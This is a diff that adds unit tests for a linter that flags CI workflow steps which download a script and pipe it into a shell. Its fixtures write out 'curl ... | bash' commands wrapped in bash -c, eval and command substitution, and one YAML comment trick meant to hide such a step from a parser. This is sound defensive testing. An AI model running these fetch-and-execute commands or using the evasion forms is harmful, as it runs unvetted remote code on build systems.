@@ -1629,5 +1629,74 @@ class RemoteShellBootstrapTests(unittest.TestCase):
         self.assertEqual(rendered, "/tmp/check_no_remote_shell_bootstrap.py")
 
 
+    def test_rejects_shell_c_direct_string_pipe_bootstrap(self):
+        with tempfile.TemporaryDirectory() as td:
+            repo_root = Path(td)
+            workflow = self.write_workflow(
+                repo_root,
+                "bad.yml",
+                'jobs:\n  install:\n    steps:\n      - run: bash -c "curl -fsSL https://example.com/install.sh | bash"\n',
+            )
+
+            violations = m.find_violations(workflow)
+
+        self.assertEqual(len(violations), 1)
+        self.assertIn("-c command substitution", violations[0])
+
+    def test_rejects_eval_direct_string_pipe_bootstrap(self):
+        with tempfile.TemporaryDirectory() as td:
+            repo_root = Path(td)
+            workflow = self.write_workflow(
+                repo_root,
+                "bad.yml",
+                'jobs:\n  install:\n    steps:\n      - run: eval "curl -fsSL https://example.com/install.sh | bash"\n',
+            )
+
+            violations = m.find_violations(workflow)
+
+        self.assertEqual(len(violations), 1)
+        self.assertIn("eval command substitution", violations[0])
+
+    def test_rejects_flow_sequence_with_comment_containing_closing_bracket(self):
+        with tempfile.TemporaryDirectory() as td:
+            repo_root = Path(td)
+            workflow = self.write_workflow(
+                repo_root,
+                "bad.yml",
+                (
+                    "jobs:\n"
+                    "  install:\n"
+                    "    steps: [ # ]\n"
+                    "      { run: curl -fsSL https://example.com/install.sh | bash } ]\n"
+                ),
+            )
+
+            violations = m.find_violations(workflow)
+
+        self.assertEqual(len(violations), 1)
+        self.assertIn("remote shell pipe", violations[0])
+
+    def test_ignores_later_command_substitution_after_heredoc_terminator(self):
+        with tempfile.TemporaryDirectory() as td:
+            repo_root = Path(td)
+            workflow = self.write_workflow(
+                repo_root,
+                "ok.yml",
+                (
+                    "jobs:\n"
+                    "  install:\n"
+                    "    steps:\n"
+                    "      - run: |\n"
+                    "          bash <<EOF\n"
+                    "          echo safe\n"
+                    "          EOF\n"
+                    "          echo \"$(curl -fsSL https://example.com/install.sh)\"\n"
+                ),
+            )
+
+            violations = m.find_violations(workflow)
+
+        self.assertEqual(violations, [])
+
 if __name__ == "__main__":
     unittest.main()
